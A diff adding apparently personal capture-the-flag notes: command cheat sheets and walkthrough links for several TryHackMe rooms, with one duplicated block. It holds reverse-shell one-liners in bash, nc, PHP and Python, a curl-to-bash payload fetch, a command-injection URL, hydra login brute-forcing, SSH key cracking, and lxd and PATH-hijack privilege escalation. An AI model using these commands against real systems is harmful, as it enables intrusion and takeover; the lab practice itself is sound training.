@@ -1,0 +1,384 @@
+sudo nmap 127.0.0.1 -oN Nmap/initial
+sudo nmap 127.0.0.1 -p- -oN Nmap/all
+sudo nmap 127.0.0.1 -p21,80,10000,55007 -sC -sV -O -T5 -oN Nmap/scripts
+
+sudo nmap -sC -sV -Pn -n --disable-arp-ping --top-ports=1000 127.0.0.1
+sudo nmap -sC -sV -Pn -n --disable-arp-ping -p10000-50000 127.0.0.1
+nmap -p21,80,10000,55007 -sV -sC -T4 -Pn -oA 127.0.0.1
+
+nmap -Pn -A -v 127.0.0.1
+
+ftp 127.0.0.1
+ls -lah
+get .info.txt
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://127.0.0.1/FUZZ
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://127.0.0.1/joomla/FUZZ — recursion — recursion-depth 1
+ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://127.0.0.1/joomla/FUZZ — recursion — recursion-depth 1 -e txt
+
+http://10.10.120.184/joomla/_test/index.php?plot=;ls
+http://10.10.120.184/joomla/_test/index.php?plot=;cat%20log.txt
+
+ssh -p 55007 basterd@10.10.186.184
+ls -alh
+cat backup.sh
+
+ssh -p 55007 stoner@10.10.186.184
+
+python3 -m http.server
+curl http://[VPN IP]:8000/linpeas.sh | bash
+
+find /usr/bin
+find . -exec /bin/sh -p \; -quit
+
+
+https://r4bb1t.medium.com/boiler-ctf-write-up-79bcbe77e924
+
+
+sudo nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 127.0.0.1
+nmap -A 127.0.0.1
+nmap -sV -sC -p- 127.0.0.1
+
+rustscan -a 127.0.0.1
+nmap -sV -p 22,80,222,1337,3000,8080 127.0.0.1
+
+
+Shell:
+bash -c "bash -i >& /dev/tcp/127.0.0.1/9000 0>&1"
+bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
+
+nc -lnvp 1234
+
+whoami
+uname -a
+ls 
+ls -la
+
+python -m http.server
+wget 127.0.0.1 /lipeash.sh && chmod +x linpeas.sh && ./linpeash.sh
+
+
+https://medium.com/@krang2k/tryhackme-cat-pictures-2-46d90e57deac
+https://medium.com/@cpadlab/cat-pictures-2-thm-writeup-90580c6d6fcc
+https://github.com/wsmaxcy/Cat-Pictures-2-Writeup?tab=readme-ov-file
+https://abylin.medium.com/cat-pictures-2-tryhackme-walkthrough-51e0425184e4
+
+
+
+
+
+
+
+nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 -sV 127.0.0.1
+nmap -sC -sV 127.0.0.1
+nmap -p- 127.0.0.1
+masscan 127.0.0.1 — ports 0–65535
+nmap -A -T4 -p 4420,22,21,8080 127.0.0.1
+
+gobuster dir -u http://127.0.0.1:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x tar,php,cgi,txt
+dirsearch -u 127.0.0.1
+
+knock 10.10.24.249 1111 2222 3333 4444 -v
+
+ftp 10.10.24.249
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKING_IP 443 >/tmp/f
+
+
+https://arrowa.medium.com/cat-pictures-ctf-tryhackme-730de7a12a42
+https://fluffme.notion.site/TryHackMe-Cat-Pictures-da1d2da393a44c52b95d7807e6a880b9
+https://linkedroot.wordpress.com/2021/06/05/cat-pictures-tryhackme/
+https://m3n0sd0n4ld.github.io/patoHackventuras/CatPictures
+https://defaltlibary.blogspot.com/2021/06/cat-pictures-tryhackme.html
+
+
+
+--Flag Fest 2024:
+
+** If this is web. try to read source code, wappalyzer, dirsearch, robots.txt, secret file etc.
+** if you find login panel try username fuzzing. you can use burpsuite or ffuf
+** use web content discovery. you can use ffuf or burpsuite or dirsearch
+** if you find any upload try reverse shell. 
+** If you find any rsa key save as pub
+
+nmap -sC -sV 127.0.0.1
+nmap --script=http* 127.0.0.1 -p 80
+smap 127.0.0.1
+smap -sV 127.0.0.1
+
+ffuf -u http://10.10.39.226/FUZZ -w common.txt -e .txt
+
+
+ftp 127.0.0.1
+get name.txt
+ls -a
+
+use kali and cmd also:
+python -m http.server 800
+
+ssh user@password -i key.pub
+
+
+interactive Shell:
+ping ip
+ping ip -c 3
+cd ..
+ls ../
+ls ../../../../../
+
+
+ssh user@password -i key.pub
+cd /var/www/html/user_upload/
+mv linpeas.txt linpeas.sh
+cp linpeas.txt linpeas.sh
+cp linpeas.txt /tmp
+cd /tmp
+cp linpeas.txt linpeas.sh
+chmod +x *
+./linpeas.sh {notice file with interesting permission}
+
+Content Discovery:
+ffuf -u http://127.0.0.1/FUZZ -w /path/to/wordlist.txt -mc all
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -o results.json -of json
+dirsearch -u http://127.0.0.1 -w /path/to/wordlist.txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -e php,html,txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"
+
+Username Fuzzing:
+https://github.com/raytheon0x21/fuzzing/blob/main/username.txt
+https://github.com/jeanphorn/wordlist/blob/master/usernames.txt
+https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+
+https://gist.github.com/mrpapercut/9e4f511e74fdf3796d0abcc4de182b65
+
+https://gtfobins.github.io/
+
+--Flag Fest 2024:
+
+** If this is web. try to read source code, wappalyzer, dirsearch, robots.txt, secret file etc.
+** if you find login panel try username fuzzing. you can use burpsuite or ffuf
+** use web content discovery. you can use ffuf or burpsuite or dirsearch
+** if you find any upload try reverse shell. 
+** If you find any rsa key save as pub
+
+nmap -sC -sV 127.0.0.1
+nmap --script=http* 127.0.0.1 -p 80
+smap 127.0.0.1
+smap -sV 127.0.0.1
+
+ffuf -u http://10.10.39.226/FUZZ -w common.txt -e .txt
+
+
+ftp 127.0.0.1
+get name.txt
+ls -a
+
+use kali and cmd also:
+python -m http.server 800
+
+ssh user@password -i key.pub
+
+
+interactive Shell:
+ping ip
+ping ip -c 3
+cd ..
+ls ../
+ls ../../../../../
+
+
+ssh user@password -i key.pub
+cd /var/www/html/user_upload/
+mv linpeas.txt linpeas.sh
+cp linpeas.txt linpeas.sh
+cp linpeas.txt /tmp
+cd /tmp
+cp linpeas.txt linpeas.sh
+chmod +x *
+./linpeas.sh {notice file with interesting permission}
+
+Content Discovery:
+ffuf -u http://127.0.0.1/FUZZ -w /path/to/wordlist.txt -mc all
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
+ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -o results.json -of json
+dirsearch -u http://127.0.0.1 -w /path/to/wordlist.txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -e php,html,txt
+dirsearch -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"
+
+Username Fuzzing:
+https://github.com/raytheon0x21/fuzzing/blob/main/username.txt
+https://github.com/jeanphorn/wordlist/blob/master/usernames.txt
+https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+
+https://gist.github.com/mrpapercut/9e4f511e74fdf3796d0abcc4de182b65
+
+https://gtfobins.github.io/
+
+nmap -sC -sV 127.0.0.1
+
+gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
+gobuster dir -u http://127.0.0.1 -w /path/to/wordlist.txt -x php
+dirsearch -u http://127.0.0.1
+
+ssh2john secretKey > id_rsa.hash
+john --wordlist=dict.lst id_rsa.hash
+
+john --wordlist=../rockyou.txt id_rsa.hash 
+john --show id_rsa.hash  
+
+ssh -i secretKey john@10.10.218.145
+
+id 
+
+git clone https://github.com/saghul/lxd-alpine-builder.git
+sudo ./build-alpine
+
+python3 -m http.server
+
+
+lxc image import ./alpine-* --alias myimage
+lxc image list
+lxc init myimage image -c security.privileged=true
+lxc config device add image mydevice disk source=/ path=/mnt/root recursive=true
+lxc start image
+lxc exec image /bin/sh
+
+
+https://doct3rjohn.medium.com/tryhackme-gaming-server-ctf-184277c2a8f1
+https://yebberdog.medium.com/try-hack-me-gaming-server-walkthrough-e85dd5d94aa8
+https://www.infosecarticles.com/tryhackme-gaming-server-walkthrough/
+nmap -sn 127.0.0.1/24
+nmap -sV -sC 127.0.0.1
+nmap -A -p- -v 127.0.0.1
+sudo nmap -sC -sV -O -p- 127.0.0.1
+nmap -sS -sV -p- 127.0.0.1
+nmap -A 127.0.0.1
+nikto -h 127.0.0.1
+
+dirsearch -u 127.0.0.1 -t 50 -w medium.txt 
+gobuster dir -u 127.0.0.1 -w file
+gobuster dir -u http://10.10.173.33 -w /usr/share/wordlists/dirb/common.txt -o dirs.txt
+
+sudo wpscan --url 127.0.0.1 -e u
+sudo wpscan --url 127.0.0.1 -U username.txt
+sudo wpscan --url 127.0.0.1 -U user -P password.txt
+
+hydra -L fsocity.dic -p 123453453 {IP} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+
+if you find wordpress file then go to : appearance > editor > 404.php or goto wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+
+and edit ip is tun0 ip
+
+wp-content/theme/twentyfifteen/404.php
+
+Upload php shell and trigure with nc -lvnp 1234
+
+After listening
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+ls -la
+pwd
+cd /home
+cd robot
+ls
+cat 
+su robot
+ls -la
+cat 
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+
+https://gtfobins.github.io/
+
+ls
+whoami
+cd root
+ls
+cat 
+
+
+https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7
+https://medium.com/@aayanx41/tryhackme-mr-robot-ctf-242a35afd946
+https://infosecwriteups.com/mr-robot-ctf-weiteup-tryhackme-vulnhub-a995b45e1eea
+
+
+nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 -sV  10.10.93.100
+
+fffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.93.100/FUZZ -e php
+dirsearch -u 10.10.93.100
+gobuster dir -u 10.10.93.100 -w directory-list-2.3-medium.txt
+
+john --wordlist=rockyou.txt hash.txt
+
+ssh2john key > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+ssh barry@10.10.93.100 -i key
+
+find / -perm -u=s -type f 2>/dev/null
+ls -la /home/joe/
+strings /home/joe/live_log
+
+cd /tmp
+echo "/bin/bash" > tail
+chmod 777 tail
+export PATH=/tmp:$PATH
+/home/joe/live_log
+cd /root
+cat root.txt
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability
+
+https://medium.com/@wiktorderda/mustacchio-tryhackme-ctf-walkthrough-71264db76a5d
+https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/
+https://syedabeerahmed.medium.com/tryhackme-mustacchio-d25c74c033bd
+https://medium.com/@oleg-zh/mustacchio-tryhackme-123ceecb5b4c
+
+nmap -sV -sC 10.10.117.140
+rustscan -a 10.10.117.140
+nmap -p 21,22,80 -sV 10.10.117.140
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://psychobreak/SafeHeaven
+dirsearch -u 10.10.117.140
+ffuf -u http://10.10.167.133/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion
+
+steghide extract -sf Joseph_Oda.jpg
+
+ftp 10.10.117.140
+ls -la
+mget file
+
+ssh kidman@10.10.117.140 
+find / -name *the_eye_of_ruvik* 2>/dev/null
+
+try to use:
+cat /etc/passwd
+ls -la
+ls ../
+ls ../../
+pwd
+id
+
+Reverse Shell codes:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/psychoBreak/psychobreak.md
+https://octothorp88.medium.com/tryhackme-psycho-break-2784c4fd0ce6
+https://yebberdog.medium.com/tryhackme-psycho-break-walkthrough-522187308f06
+
+
+
+
+
+
